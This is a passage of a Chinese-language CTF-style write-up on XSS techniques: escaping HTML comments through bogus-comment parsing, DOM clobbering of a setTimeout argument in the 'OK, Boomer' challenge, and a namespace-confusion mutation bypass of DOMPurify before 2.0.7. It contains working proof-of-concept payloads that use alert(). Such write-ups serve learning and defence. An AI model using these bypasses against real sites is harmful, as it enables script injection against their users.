!-/#&amp;;% 全部被替换为_</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">&lt;?&gt;&lt;svg onload=alert(1)&gt;</span><br><span class=\"line\">&lt;?&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br><span class=\"line\">&lt;?&gt;&lt;a href=javascript:alert(1)&gt;aaa</span><br><span class=\"line\">只要能闭合注释，后面的基本除了script标签之外可以乱写</span><br><span class=\"line\">    </span><br><span class=\"line\">如果直接闭合，--会被替换，&gt;会被innerhtml转义</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;__&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;!-- --&gt;是多行注释，换行也不行，换行效果： ?debug=%0a&lt;svg/onload=alert(1)&gt;</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;</span><br><span class=\"line\">&lt;svg_onload=alert(1)&gt;&lt;/svg_onload=alert(1)&gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">但如果输入&lt;?&gt;  ?debug=&lt;?&gt;aaaaaaaaaaa</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;!--?--&gt;</span><br><span class=\"line\">aaaaaaaaaaa</span><br><span class=\"line\">&lt;p&gt;&lt;/p&gt; </span><br><span class=\"line\">--&amp;gt;</span><br><span class=\"line\">注释被闭合了，注释后面输入的内容可以逃逸出来</span><br><span class=\"line\">    </span><br><span class=\"line\">在template.innerHTML = input的时候，会解析input，然后使用 HTML parser 解析，根据 W3 文档</span><br><span class=\"line\">解析到&lt;的时候，HTML parser 正处于 [data state]</span><br><span class=\"line\">下一个字符是?，根据文档，HTML parser 会创建一个空的 comment token，进入 [bogus comment state]</span><br><span class=\"line\">下一个字符是 anything else，会将这个字符插入到刚刚的 comment 中，也就是我们上图看到的&lt;!--?--&gt; </span><br><span class=\"line\">例如输入是aaa&lt;?bbb&gt;ccc的时候，解析到第 i 个字符时，innerHTML 的结果是这样的</span><br><span class=\"line\">a</span><br><span class=\"line\">aa</span><br><span class=\"line\">aaa</span><br><span class=\"line\">aaa&lt;</span><br><span class=\"line\">aaa&lt;!--?--&gt;</span><br><span class=\"line\">aaa&lt;!--?b--&gt;</span><br><span class=\"line\">aaa&lt;!--?bb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;c</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;cc</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;ccc</span><br><span class=\"line\">直到该状态遇到了&gt;为止，回到 data state。注意这个 Bogus comment state 解析到&gt;的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。</span><br><span class=\"line\"></span><br><span class=\"line\">我们输入payload后：?debug=aaa&lt;?bbb&gt;ccc&lt;svg%20onload=alert(1)&gt;</span><br><span class=\"line\">首先aaa&lt;?bbb&gt;ccc 变为 aaa&lt;!--?bbb--&gt; ccc</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">&quot;ccc&quot;</span><br><span class=\"line\">&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;</span><br><span class=\"line\">成功闭合注释</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果题目没有过滤&amp;#时，存在unintended solution</span><br><span class=\"line\">payload:</span><br><span class=\"line\">&lt;img title=&quot;&amp;#x2D;&amp;#x2D;&amp;#x3E;&amp;#x3C;&amp;#x73;&amp;#x76;&amp;#x67;&amp;#x2F;&amp;#x6F;&amp;#x6E;&amp;#x6C;&amp;#x6F;&amp;#x61;&amp;#x64;&amp;#x3D;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;1&amp;#x29;&amp;#x3E;&quot;&gt;1</span><br><span class=\"line\"></span><br><span class=\"line\">我们可以用html实体编码闭合多行注释</span><br><span class=\"line\">但：简单的--&gt;; 并不能闭合,因为第一次的innerHTML会将&gt;进行编码为实体，第二次innerhtml时传入的是--&amp;gt;不能闭合</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">但img标签中title可以绕过，因为第一次HTML parser不会将 title 属性内的字符串进行转义</span><br><span class=\"line\">&lt;svg&gt;&lt;b title=&quot;--&gt;&lt;svg/onload=alert()&gt;&quot;&gt;aaa</span><br><span class=\"line\">最终在html中渲染的是</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=&quot;--&gt;&lt;svg onload=&quot;alert()&quot;&gt;&quot;&amp;gt;1 &lt;/svg&gt;&lt;p&gt;&lt;/p&gt; --&amp;gt;</span><br><span class=\"line\">然后当 HTML parser 解析这段代码时，首先由&lt;!的存在，会进入[Markup declaration open state]，中间的代码&lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=”会让 HTML parser 进入一些其他关于 comment 的状态，这些都无关紧要，最后的–&gt;让 HTML parser 进入到了[Comment End State]</span><br></pre></td></tr></table></figure>\n<h2 id=\"okboomer\"><a class=\"markdownIt-Anchor\" href=\"#okboomer\">#</a> OK，Boomer</h2>\n<p><strong>前置知识：</strong></p>\n<p>1.DOM 中内容会影响 Windows</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;btn&quot;</span>&gt;</span>click me<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">btn</span>)  <span class=\"comment\">//&lt;button id=&quot;btn&quot;&gt;click me&lt;/button&gt;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>只需要用 id 同名就可以拿到 html 元素</p>\n<p>也就是说除了  <code>id</code>  可以直接用  <code>window</code>  存取， <code>embed</code> ,  <code>form</code> ,  <code>img</code>  和  <code>object</code>  这四个标签用  <code>name</code>  也可以操作：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">embed</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;a&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">embed</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;b&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;c&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">object</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;d&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">object</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">c</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>通过 html 影响 js</p>\n<p>1) 利用 html 标签的属性 id，很容易在 window 对象上创建任意的属性，但是我们能在新对象上创建新属性吗？</p>\n<p>2) 怎么控制 DOM elements 被强制转为 string 之后的值，大多数的 dom 节点被转为 string 后是 [object HTMLInputElement]。</p>\n<p>关于问题 1)</p>\n<p>最常引用的解决方法是使用 <code>&lt;form&gt;</code>  标签。标记的每个 <code>&lt;input&gt;</code>  都属于 <code>&lt;form&gt;</code>  后代，该属性 <code>&lt;form&gt;</code>  引用 <code>name</code>  属性可以取到 <code>&lt;input&gt;</code> 。考虑以下示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=test1&gt;</span><br><span class=\"line\">  &lt;input name=test2&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  alert(test1.test2); // alerts &quot;[object HTMLInputElement]&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>可以通过 name 取值，但取到的值是对象，即引出问题 2)</p>\n<p>js 内部会执行两个方法 tovalue,tostring，因为 js 的原型链</p>\n<p>一般来说，对象的 <code>valueof</code>  方法总是返回对象自身，这时再自动调用对象的 <code>tostring</code>  方法，将其转为字符串。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; p: 1 &#125;;</span><br><span class=\"line\">obj.valueof().tostring() // &quot;[object object]&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>对象的 <code>tostring</code>  方法默认返回 <code>[object object]</code> ，所以就得到了最前面那个例子的结果。</p>\n<p>通过遍历 HTML 中所有可能的元素并检查它们的 <code>toString</code>  方法是否继承自 <code>Object.prototype</code>  或以另一种方式定义</p>\n<p>一个简短的 JS 代码，它遍历 HTML 中所有可能的元素并检查它们的 <code>toString</code>  方法是否继承自 <code>Object.prototype</code>  或以另一种方式定义。如果它们不继承自 <code>Object.prototype</code> ，那么可能 <code>[object SomeElement]</code>  会返回其他东西。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.getOwnPropertyNames(window)   //获取Window下object所有属性</span><br><span class=\"line\">.filter(p =&gt; p.match(/Element$/))   //匹配以element结尾的属性</span><br><span class=\"line\">.map(p =&gt; window[p])</span><br><span class=\"line\">.filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== Object.prototype.toString)  //找到不继承object的tostring的元素</span><br></pre></td></tr></table></figure>\n<p>得到结果 <code>HTMLAreaElement</code> （ <code>&lt;area&gt;</code> ）和 <code>HTMLAnchorElement</code> （ <code>&lt;a&gt;</code> ）这两个元素不继承 tostring 方法</p>\n<p>在 <code>&lt;a&gt;</code>  元素的情况下， <code>toString</code>  只返回一个 <code>href</code>  属性值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1 href=https://securitum.com&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  alert(test1); // alerts &quot;https://securitum.com&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>由于没有继承 tostring 导致弹出的不再是 object htmlinputelement，a 标签可以控制弹出的内容</p>\n<p>但是以下代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (window.test1.test2) &#123;</span><br><span class=\"line\">    eval(&#x27;&#x27;+window.test1.test2)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行结果为 undefined</p>\n<p>假设有两个 id 一样的元素</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1&gt;click!&lt;/a&gt;</span><br><span class=\"line\">&lt;a id=test1&gt;click2!&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>通过 id 取值，得到 htmlcollection，htmlcollection 可以通过索引取值， <code>window.test1.test1</code>  实际上是指第一个元素，但无法取到第二个元素</p>\n<p>如果想取到第二个元素，需要给第二个元素加 name 值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1&gt;click!&lt;/a&gt;</span><br><span class=\"line\">&lt;a id=test1 name=test2&gt;click2!&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>我们可以通过 name 访问第二个 a <code>window.test1.test2</code></p>\n<p>通过给第二个 a 加 href 控制弹出内容</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;test2&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;x:alert(1)&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>但 x 不是标准协议，需要使用协议比如 <code>tel,mailto,cid,javascript</code>  等</p>\n<p>即：需要有两个 a 标签，且需要通过 name 去到第二个 a 标签</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM3MTA2MTUwNzQtNzAwNGY1NGUtM2YyMy00NTc0LWJhYWYtMTk0MTI3MzEyZjIwLm1k\">📎Ok, Boomer.md</span></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;boomer&quot;</span>&gt;</span>Ok, Boomer.<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    boomer.<span class=\"property\">innerHTML</span> = <span class=\"title class_\">DOMPurify</span>.<span class=\"title function_\">sanitize</span>(<span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;boomer&#x27;</span>) || <span class=\"string\">&quot;Ok, Boomer&quot;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"built_in\">setTimeout</span>(ok, <span class=\"number\">2000</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>setTimeout (ok, 2000) 中的 ok 可以接收一个函数或者字符串，如果我们能够向 ok 这个变量注入可执行的 payload，那么也就能成功弹框</p>\n<p>可以使用 DOM Clobbering 的方式，通过向 HTML 注入 DOM 元素，来实现操作 JavaScript 变量</p>\n<p>首先，要构造一个变量 ok，我们可以通过创建一个 id=ok 的 DOM 元素来实现，比如<div id=\"ok\"></div></p>\n<p>然后，ok 需要接受一个字符串作为值，而在对<a>标签调用 toString () 方法时，会返回属性 href 的值，所以，我们可以选择<a>标签作为构造对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?boomer=&lt;a id=ok href=cid:alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<p>href 的值要遵守 protocol:uri 的格式，然而，在 href 里直接使用 javascript: 协议是不行的</p>\n<p>通过查看 DOMPurify 的源码可以发现，它支持的合法的协议 有 mailto, tel, xmpp 等等，随便选择一个即可</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?boomer=&lt;a%20id=ok%20href=mailto:alert(1337)&gt;</span><br><span class=\"line\">?boomer=&lt;a%20id=ok%20href=tel:alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<p>由于劫持了 settimeout，因此会延迟两秒执行</p>\n<p>通过两个 id 可以取到的标签：</p>\n<p>form,button</p>\n<p>form,fieldset</p>\n<p>form,image</p>\n<p>form,img</p>\n<p>form,input</p>\n<p>form,object</p>\n<p>form,output</p>\n<p>form,select</p>\n<p>form,textarea</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x&gt;</span><br><span class=\"line\">\t&lt;img id=y&gt;</span><br><span class=\"line\">console.log(x.y)  //&lt;img id=y&gt;</span><br></pre></td></tr></table></figure>\n<p>通过三层嵌套取到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x&gt;</span><br><span class=\"line\">&lt;form id=x name=y&gt;</span><br><span class=\"line\">&lt;input id=z&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">window.x.y.z.value</span><br></pre></td></tr></table></figure>\n<p>unintended solution</p>\n<p>利用 html-svg-math 的命名空间混淆突变绕过 dompurify，要求 dompurify 版本 &lt; 2.0.7</p>\n<p>前置知识：</p>\n<p>1.DOMPurify 的典型用法使 HTML 标记被解析两次。</p>\n<p>dompurify 使用语句如下</p>\n<p><code>div.innerHTML = DOMPurify.sanitize(htmlMarkup)</code></p>\n<p>在解析和序列化 HTML 以及对 DOM 树的操作方面，在上面的简短片段中发生了以下操作：</p>\n<ol>\n<li><code>htmlMarkup</code>  <strong>被解析为 DOM 树</strong>。</li>\n<li>DOMPurify 清理 DOM 树（简而言之，该过程是遍历 DOM 树中的所有元素和属性，并删除所有不在允许列表中的节点）。</li>\n<li>DOM 树<strong>被序列化回 HTML 标记</strong>。</li>\n<li>分配给 后 <code>innerHTML</code> ，浏览器会<strong>再次解析 HTML 标记</strong>。</li>\n<li>解析后的 DOM 树被附加到文档的 DOM 树中。</li>\n</ol>\n<p>假设我们的初始 html 是 <code>A&lt;img src=1 onerror=alert(1)&gt;B</code> 。在第一步中，它被解析为以下树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-1-1536x155.png\" alt=\"\"></p>\n<p>然后，DOMPurify 对其进行清理，留下以下 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-2-1536x161.png\" alt=\"\"></p>\n<p>然后它被序列化为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A&lt;img src=&quot;1&quot;&gt;B</span><br></pre></td></tr></table></figure>\n<p>这就是 <code>DOMPurify.sanitize</code>  的返回值。然后浏览器在分配给 innerHTML 时再次解析：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1536x161.png\" alt=\"\"></p>\n<p>DOM 树与 DOMPurify 处理的树相同，然后附加到文档中。</p>\n<p>所以附加到文档之前需要解析 - 序列化 - 解析。但<strong>两次解析的 DOM 树未必相同</strong>。</p>\n<p>2.HTML 规范有一个问题，它使得创建嵌套 <code>form</code>  元素成为可能。但是，在重新解析时，第二个 <code>form</code>  将消失。</p>\n<p>html 规范中，不允许 form 元素的子元素是 form。那么说明嵌套 form 元素是不被允许的。这会导致嵌套里面的 form 元素被 html 解析器忽略。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=form1&gt;</span><br><span class=\"line\">INSIDE_FORM1</span><br><span class=\"line\">&lt;form id=form2&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-5-1536x121.png\" alt=\"\"></p>\n<p>我们可以通过带有错误嵌套标签的稍微损坏的标记，可以创建嵌套表单。</p>\n<p><code>&lt;form id=&quot;outer&quot;&gt;&lt;div&gt;&lt;/form&gt;&lt;form id=&quot;inner&quot;&gt;&lt;input&gt;</code></p>\n<p>它产生以下 DOM 树，其中包含一个嵌套的表单元素：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-6-1536x211.png\" alt=\"\"></p>\n<p>这不是任何特定浏览器中的错误；它直接来自 HTML 规范，并在解析 HTML 的算法中进行了描述。这是一般的想法：</p>\n<ul>\n<li>当你打开一个 <code>&lt;form&gt;</code>  标签时，解析器需要使用<strong>表单元素指针</strong>打开的（在规范中是这样调用的）。如果指针不是 <code>null</code> ，则 <code>form</code>  无法创建元素。</li>\n<li>结束 <code>&lt;form&gt;</code>  标记时，表单元素指针始终设置为 <code>null</code> 。</li>\n</ul>\n<p>注意：一般来说子元素是要紧贴父元素的</p>\n<p>现在，如果我们尝试序列化生成的 DOM 树，我们将得到以下标记：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=&quot;outer&quot;&gt;&lt;div&gt;&lt;form id=&quot;inner&quot;&gt;&lt;input&gt;&lt;/form&gt;&lt;/div&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-7-1536x151.png\" alt=\"\"></p>\n<p>所以这证明了序列化后再次解析不能保证返回原始 DOM 树，同时再次解析后内层 form 消失了</p>\n<p>3. 外部内容</p>\n<p>HTML 解析器可以创建一个包含三个命名空间元素的 DOM 树：</p>\n<ul>\n<li>HTML 命名空间</li>\n<li>SVG 命名空间</li>\n<li>MathML 命名空间 ，是 XML 语言的子集 zhangxinxu</li>\n</ul>\n<p>默认情况下，所有元素都在 HTML 命名空间中；但是，如果解析器遇到 <code>&lt;svg&gt;</code> or <code>&lt;math&gt;</code>  元素，则它分别 “切换” 到 SVG 和 MathML 命名空间。并且这两个命名空间都会产生外部内容。</p>\n<p>在外部内容中，标记的解析方式与普通 HTML 不同。这可以在解析 <code>&lt;style&gt;</code>  元素时清楚地显示出来。在 HTML 命名空间中， <code>&lt;style&gt;</code>  只能包含文本；没有后代，并且不解码 HTML 实体。外部内容并非如此：外部内容 <code>&lt;style&gt;</code>  可以有子元素，并且实体被解码。</p>\n<p><code>&lt;style&gt;&lt;a&gt;ABC&lt;/style&gt;&lt;svg&gt;&lt;style&gt;&lt;a&gt;ABC</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8-1536x308.png\" alt=\"\"></p>\n<p>证明了 svg 命名空间中的 style 可以被解析</p>\n<p>如果我们在里面 <code>&lt;svg&gt;</code> ， <code>&lt;math&gt;</code>  那么所有元素也都在非 HTML 命名空间中。但是这是错误的。HTML 规范中有一些元素称为<strong> MathML 文本集成点</strong>和<strong> HTML 集成点</strong>。这些元素的子元素具有 HTML 命名空间</p>\n<p><code>&lt;math&gt;&lt;style&gt;&lt;a&gt;A&lt;/style&gt;&lt;mtext&gt;&lt;style&gt;&lt;a&gt;B&lt;/style&gt;</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9-1536x207.png\" alt=\"\"></p>\n<p>请注意 <code>style</code>  作为 math 的直接子元素 <code>在 MathML 命名空间中，而</code> 第二个 style <code>在mtext下则是 HTML 命名空间中。这是因为</code>  mtext` 是<strong> MathML 文本集成点</strong>并使解析器切换命名空间。</p>\n<p>MathML 文本集成点是：</p>\n<ul>\n<li><code>math mi</code></li>\n<li><code>math mo</code></li>\n<li><code>math mn</code></li>\n<li><code>math ms</code></li>\n</ul>\n<p>HTML 集成点是：</p>\n<ul>\n<li><code>math annotation-xml</code>  如果它有一个名为的属性， <code>encoding</code>  其值等于 <code>text/html</code>  或  <code>application/xhtml+xml</code></li>\n<li><code>svg foreignObject</code></li>\n<li><code>svg desc</code></li>\n<li><code>svg title</code></li>\n</ul>\n<p>但并不是所有 mathml 文本集成点和 html 集成点子元素都是 html 命名空间的</p>\n<p>html 规范中，大部分 Mathml 文本集成点的子元素都是 HTML 命名空间的啊，但是除了<mglyph><malignmark>。当这两直接是 Mathml 文本集成点的直接子元素的时候。他们不会切换命名空间。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-10-1536x252.png\" alt=\"\"></p>\n<p>最终 payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>使用以上所有内容，我们可以创建一个包含两个 <code>form</code>  元素和 <code>mglyph</code>  元素的标记，该标记最初位于 HTML 命名空间中，但在重新解析它时位于 MathML 命名空间中，从而使后续 <code>style</code>  标记的解析方式不同并导致 XSS。</p>\n<p>payload 利用错误嵌套的 <code>html form</code>  元素，并且还包含 <code>mglyph</code>  元素。它生成以下 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-11-1536x326.png\" alt=\"\"></p>\n<p>这个 DOM 树是无害的。所有元素都在 DOMPurify 的允许列表中。请注意，这 <code>mglyph</code>  是在 HTML 命名空间中。看起来像 XSS playload 的片段只是 <code>html style</code> . 因为有一个嵌套的 <code>html form</code> ，我们可以非常确定这个 DOM 树将在重新解析时发生变异。</p>\n<p>序列化之后的 html 是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/form&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>\n<p>此代码段具有嵌套 <code>form</code>  标签。所以当它被赋值给 时 <code>innerHTML</code> ，它会被解析成下面的 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-12-1536x312.png\" alt=\"\"></p>\n<p>所以现在第二个 <code>html form</code>  没有被创建， <code>mglyph</code>  现在是 